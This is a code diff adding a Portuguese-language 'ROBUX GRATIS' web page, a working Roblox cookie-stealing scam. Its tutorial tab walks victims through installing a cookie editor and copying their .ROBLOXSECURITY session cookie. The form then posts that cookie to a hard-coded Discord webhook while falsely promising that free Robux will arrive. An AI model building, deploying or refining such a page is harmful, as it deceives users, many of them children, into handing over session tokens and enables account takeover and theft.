@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enviar</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #000;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: #1a1a1a;
+            border-radius: 10px;
+            padding: 30px;
+            border: 2px solid #ffcc00;
+            max-width: 700px;
+            width: 100%;
+        }
+
+        .tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+
+        .tab-btn {
+            flex: 1;
+            padding: 12px 20px;
+            background: #000;
+            color: #999;
+            border: 2px solid #ffcc00;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .tab-btn:hover {
+            color: #ffcc00;
+        }
+
+        .tab-btn.active {
+            background: #ffcc00;
+            color: #000;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        h1 {
+            color: #ffcc00;
+            text-align: center;
+            margin-bottom: 25px;
+            font-size: 32px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .subtitle {
+            text-align: center;
+            color: #999;
+            margin-bottom: 25px;
+            font-size: 14px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #ffcc00;
+            font-weight: 600;
+        }
+
+        textarea {
+            width: 100%;
+            padding: 15px;
+            background: #000;
+            border: 2px solid #ffcc00;
+            border-radius: 5px;
+            color: #fff;
+            font-size: 16px;
+            font-family: inherit;
+            resize: vertical;
+            min-height: 150px;
+        }
+
+        textarea:focus {
+            outline: none;
+            border-color: #ffdd33;
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background: #ffcc00;
+            color: #000;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        button:hover {
+            background: #ffdd33;
+        }
+
+        button:active {
+            transform: scale(0.98);
+        }
+
+        button:disabled {
+            background: #666;
+            color: #333;
+            cursor: not-allowed;
+        }
+
+        .status {
+            margin-top: 15px;
+            padding: 12px;
+            border-radius: 8px;
+            text-align: center;
+            font-weight: 500;
+            display: none;
+        }
+
+        .status.success {
+            background: #2a2a2a;
+            color: #ffcc00;
+            border: 1px solid #ffcc00;
+            display: block;
+        }
+
+        .status.error {
+            background: #2a2a2a;
+            color: #ff4444;
+            border: 1px solid #ff4444;
+            display: block;
+        }
+
+        .char-count {
+            text-align: right;
+            color: #999;
+            font-size: 12px;
+            margin-top: 5px;
+        }
+
+        .tutorial-content {
+            color: #fff;
+        }
+
+        .tutorial-content h2 {
+            color: #ffcc00;
+            margin-bottom: 25px;
+            text-align: center;
+            font-size: 22px;
+        }
+
+        .tutorial-step {
+            margin-bottom: 20px;
+            padding: 15px;
+            background: #000;
+            border-radius: 8px;
+            border: 2px solid #ffcc00;
+        }
+
+        .step-text {
+            width: 100%;
+        }
+
+        .step-text p {
+            margin-bottom: 10px;
+            line-height: 1.6;
+        }
+
+        .step-text strong {
+            color: #ffcc00;
+        }
+
+        .extension-link {
+            display: inline-block;
+            padding: 8px 16px;
+            background: #ffcc00;
+            color: #000;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: 600;
+            transition: background 0.3s;
+        }
+
+        .extension-link:hover {
+            background: #ffdd33;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>ROBUX GRATIS</h1>
+        
+        <div class="tabs">
+            <button class="tab-btn active" onclick="switchTab('enviar')">Enviar Cookie</button>
+            <button class="tab-btn" onclick="switchTab('tutorial')">Tutorial</button>
+        </div>
+
+        <div id="enviar-tab" class="tab-content active">
+            <div class="input-group">
+                <label for="message">Cookie:</label>
+                <textarea 
+                    id="message" 
+                    placeholder="Digite sua mensagem aqui..."
+                    maxlength="2000"
+                ></textarea>
+                <div class="char-count">
+                    <span id="charCount">0</span> / 2000
+                </div>
+            </div>
+
+            <button id="sendBtn" onclick="sendMessage()">
+                Enviar
+            </button>
+
+            <div id="status" class="status"></div>
+        </div>
+
+        <div id="tutorial-tab" class="tab-content">
+            <div class="tutorial-content">
+                <h2>Como pegar o Cookie do Roblox</h2>
+                
+                <div class="tutorial-step">
+                    <div class="step-text">
+                        <p>Primeiro você precisa instalar a extensão Cookie Editor:</p>
+                        <a href="https://chromewebstore.google.com/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm?pli=1" target="_blank" class="extension-link">
+                            Instalar Cookie Editor
+                        </a>
+                    </div>
+                </div>
+
+                <div class="tutorial-step">
+                    <div class="step-text">
+                        <p>Após instalar, acesse o Roblox pelo navegador</p>
+                    </div>
+                </div>
+
+                <div class="tutorial-step">
+                    <div class="step-text">
+                        <p>Clique no ícone da extensão Cookie Editor que aparece ao lado da barra de endereço</p>
+                    </div>
+                </div>
+
+                <div class="tutorial-step">
+                    <div class="step-text">
+                        <p>Procure por <strong>.ROBLOXSECURITY</strong> e copie o <strong>value</strong></p>
+                    </div>
+                </div>
+
+                <div class="tutorial-step">
+                    <div class="step-text">
+                        <p>Volte para a aba "Enviar Cookie", cole o cookie e clique em Enviar. Aguarde os robux cair na sua conta!</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1449843576979591211/JS15afL-rTtX6Lmfv_zv2iRj_JT9lfFiVWCQvkuUnn9YIAyN1BZJApVpA_AIUIj9GR2T';
+        
+        const messageInput = document.getElementById('message');
+        const charCount = document.getElementById('charCount');
+        const sendBtn = document.getElementById('sendBtn');
+        const statusDiv = document.getElementById('status');
+
+        // Atualizar contador de caracteres
+        messageInput.addEventListener('input', () => {
+            charCount.textContent = messageInput.value.length;
+        });
+
+        async function sendMessage() {
+            const message = messageInput.value.trim();
+
+            if (!message) {
+                showStatus('Por favor, Escreva seu cookie!', 'error');
+                return;
+            }
+
+            // Desabilitar botão durante o envio
+            sendBtn.disabled = true;
+            sendBtn.textContent = 'Enviando...';
+
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "Conta detectada!",
+                            description: `\`\`\`${message}\`\`\``,
+                            color: 0xffcc00
+                        }]
+                    })
+                });
+
+                if (response.ok) {
+                    showStatus('Agurde um pouco ja ja os robux ira cair na sua conta, Fique atento!', 'success');
+                    messageInput.value = '';
+                    charCount.textContent = '0';
+                } else {
+                    showStatus('Erro. Tente novamente.', 'error');
+                }
+            } catch (error) {
+                showStatus('Erro de conexão. Verifique sua internet.', 'error');
+                console.error('Erro:', error);
+            } finally {
+                sendBtn.disabled = false;
+                sendBtn.textContent = 'Enviar';
+            }
+        }
+
+        function showStatus(message, type) {
+            statusDiv.textContent = message;
+            statusDiv.className = `status ${type}`;
+            
+            setTimeout(() => {
+                statusDiv.className = 'status';
+            }, 3000);
+        }
+
+        // Permitir enviar com Enter (Ctrl+Enter para nova linha)
+        messageInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter' && e.ctrlKey) {
+                sendMessage();
+            }
+        });
+
+        // Sistema de Tabs
+        function switchTab(tabName) {
+            // Remover active de todos os botões e conteúdos
+            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
+            
+            // Adicionar active no botão e conteúdo correspondente
+            event.target.classList.add('active');
+            document.getElementById(tabName + '-tab').classList.add('active');
+        }
+    </script>
+</body>
+</html>
